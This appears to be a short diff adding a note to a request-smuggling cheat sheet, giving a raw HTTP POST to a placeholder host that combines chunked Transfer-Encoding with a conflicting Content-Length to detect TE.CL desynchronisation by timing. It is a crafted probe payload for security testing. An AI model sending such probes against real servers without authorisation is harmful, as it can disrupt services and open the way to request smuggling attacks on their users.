@@ -104,3 +104,13 @@ Content-Length: 4
 A
 X
 
+Finding TE.CL vulnerabilities using timing techniques:
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 6
+
+0
+
+X
+
